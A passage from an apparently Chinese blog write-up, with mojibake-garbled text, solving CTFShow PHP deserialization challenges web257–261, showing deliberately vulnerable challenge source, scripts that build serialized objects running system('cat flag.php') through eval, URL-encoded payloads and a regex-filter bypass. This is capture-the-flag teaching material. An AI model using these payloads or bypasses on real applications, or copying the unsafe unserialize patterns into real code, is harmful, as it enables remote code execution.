<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);<span class="comment">//ç›´æ¥è°ƒç”¨æŒ‡å‘login()å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°æ— éè¿”å›ä¸¤ä¸ªå¸ƒå°”å€¼ï¼Œtrueæˆ–è€…false.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>è¿™é¢˜çš„é‡ç‚¹åœ¨äºä¸¤ä¸ªé­”æœ¯å˜é‡ï¼Œä¸€ä¸ªè¢«åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œä¸€ä¸ªè¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚åœ¨è¿™ä¸¤ä¸ªè°ƒç”¨ä¸­æ‰ä¼šæ‰§è¡Œphpè¯­å¥ä»è€Œæ‹¿åˆ°flagã€‚</p>
</li>
<li><p>æœ¬åœ°åºåˆ—åŒ–</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;backDoor&#x27;</span>; <span class="comment">// æ›´æ”¹ä¸º backDoor</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor(); <span class="comment">// åˆå§‹åŒ–æ–¹ä¾¿åç»­</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">        <span class="comment">//$this-&gt;&#x27;backDoor&#x27;-&gt;getInfo() ï¼Œç±» backDoorä¸­çš„ getInfoå‡½æ•°æ‰èƒ½æ‰§è¡Œeval().</span></span><br><span class="line">        <span class="comment">//ç±» info ä¸­åˆ™æ²¡æœ‰evalã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;<span class="variable">$code</span>); <span class="comment">// å› ä¸ºåªæœ‰backDoor é‡Œé¢æ‰æœ‰ eval() æ‰èƒ½æ‰§è¡Œphpè¯­å¥ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$str</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>.<span class="string">&quot;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$str</span>).<span class="string">&quot;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ç»“æœ: éœ€è¦æ³¨æ„:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Public</span>å±æ€§åºåˆ—åŒ–åæ ¼å¼: æˆå‘˜å</span><br><span class="line"><span class="keyword">Private</span>å±æ€§åºåˆ—åŒ–åæ ¼å¼: %<span class="number">00</span>ç±»å%<span class="number">00</span>æˆå‘˜å</span><br><span class="line"><span class="keyword">Protected</span>å±æ€§åºåˆ—åŒ–åçš„æ ¼å¼: %<span class="number">00</span>*%<span class="number">00</span>æˆå‘˜å</span><br></pre></td></tr></table></figure>

<ul>
<li>urlencodeç¼–ç åè‡ªåŠ¨æœ‰ï¼Œä¸ç”¨æ‹…å¿ƒè¿™ä¸ªï¼</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>backDoor%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">27</span>cat+flag.php%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web257.png"></p>
<ul>
<li>Burp æ·»åŠ  cookie</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web257_1.png"></p>
<h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>ç›¸è¾ƒäºweb257 åœ¨åé¢ å¤šäº†ä¸€è¡Œæ­£åˆ™åŒ¹é…:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;/[oc]:\d+:/i&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>æ„æ€æ˜¯å­—æ¯: o:1: æˆ–è€… c:1: æ‰èƒ½è¢«åŒ¹é…ï¼Œæ•°å­—1å¯ä»¥æ›¿æ¢ä¸ºå…¶ä»–æ•°å­—ï¼Œå­—æ¯oå’ŒcäºŒé€‰ä¸€ã€‚o æ˜¯objiect,åºåˆ—åŒ–åçš„æ ¼å¼ã€‚</p>
</li>
<li><p>åŒ¹é…åˆ°äº†ä¸º true å†æ‰§è¡Œ ! ä¸º falseï¼Œ falseäº†å°±ä¸èƒ½æ‰§è¡Œ if() ä¸­çš„è¯­å¥ã€‚</p>
</li>
<li><p>è¦ç»•è¿‡è¿™ä¸ªåŒ¹é…ï¼Œè®© o: æ›¿æ¢ä¸º o:+ ï¼Œä¸å…¶æ•°å­—åˆ†éš”: o:+1 æˆ–è€… c:+1 ï¼Œ+ urlç¼–ç åä¸º : %2b, æˆ‘ä¹Ÿè¯•è¯•äº†å…¶ä»–å­—ç¬¦éš”å¼€ä½†æ²¡æˆåŠŸã€‚</p>
</li>
<li><p>æœ¬åœ°åºåˆ—åŒ–:</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$str</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>.<span class="string">&quot;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = str_replace(<span class="string">&#x27;O:&#x27;</span>,<span class="string">&#x27;O:+&#x27;</span>,<span class="variable">$str</span>); <span class="comment">// æ›¿æ¢</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>.<span class="string">&quot;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = urlencode(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ç»“æœ</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A%<span class="number">2</span>B11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A%<span class="number">2</span>B8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">27</span>cat+flag.php%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web258.png"></p>
<ul>
<li>ä¸Š bp</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web258_1.png"></p>
<h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: vip in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">6</span></span><br><span class="line"></span><br><span class="line">Fatal <span class="built_in">error</span>: Uncaught <span class="built_in">Error</span>: Call to a member <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>) <span class="title">on</span> <span class="title">bool</span> <span class="title">in</span> /<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/<span class="title">index</span>.<span class="title">php</span>:8 <span class="title">Stack</span> <span class="title">trace</span>: #0 </span>&#123;main&#125; thrown in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">8</span></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>ä¸ä¼šã€‚</li>
</ul>
<h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,serialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>if è¯­å¥ æ­£åˆ™åŒ¹é… ctfshow_i_love_36Dï¼Œ è¿™é‡Œ serialize æ˜¯ç”Ÿæˆåºåˆ—åŒ–çš„å€¼ï¼Œæ²¡æœ‰ un ï¼Œæ‰€ä»¥ç›´æ¥getä¼ å…¥:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web260.png"></p>
<h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="keyword">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>phpä¸­çš„é­”æ³•æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__wakeup() <span class="comment">//ä½¿ç”¨unserializeæ—¶è§¦å‘</span></span><br><span class="line">__sleep() <span class="comment">//ä½¿ç”¨serializeæ—¶è§¦å‘</span></span><br><span class="line">__destruct() <span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line">__call() <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line">__callStatic() <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line">__get() <span class="comment">//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span></span><br><span class="line">__set() <span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line">__isset() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span></span><br><span class="line">__unset() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span></span><br><span class="line">__toString() <span class="comment">//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></span><br><span class="line">__invoke() <span class="comment">//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br><span class="line">__construct() <span class="comment">//å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ SimpleXMLElement å¯¹è±¡ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>è¿™é¢˜ä¸€çœ‹é˜¿ï¼Œè¿™ä¹ˆå¤šï¼Œæ ¹æœ¬çœ‹ä¸è¿‡æ¥ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å½“åŒæ—¶å‡ºç° __unserialize å’Œ __wakeup çš„æ—¶å€™ï¼Œ__wakeup æ˜¯ä¸ä¼šæ‰§è¡Œçš„ï¼Œä¼šè¢«å¿½ç•¥ã€‚</span><br><span class="line">è€Œä¸” __invoke ä¹Ÿä¸ä¼šæ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure>

<ul>
<li>å¦‚ä¸‹ä»£ç :</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œcode = username å’Œ password çš„æ‹¼æ¥ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è¾“å…¥æˆ‘ä»¬çš„ä»£ç ã€‚</p>
</li>
<li><p>åˆå¦‚ä¸‹:</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
